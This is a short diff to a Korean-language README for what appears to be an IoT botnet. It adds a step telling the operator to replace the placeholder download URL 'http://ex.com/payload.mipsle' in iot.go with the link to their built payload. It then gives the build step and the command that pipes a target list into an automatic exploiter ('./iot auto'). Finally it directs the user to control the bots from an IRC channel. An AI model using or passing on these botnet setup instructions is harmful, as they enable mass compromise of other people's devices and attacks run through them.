@@ -6,8 +6,9 @@
 
 -봇 로드
 1. cd sploit
-2. go build .
-3. type list.txt | ./iot auto
+2. iot.go 'http://ex.com/payload.mipsle' 위에 빌드된 페이로드 파일 다운로드 링크로 교체
+3. go build .
+4. type list.txt | ./iot auto
 
 mIRC와 같은 IRC 클라이언트로 기본(#test) 채널에 접속 하시고 사용하시면 됩니다.
 
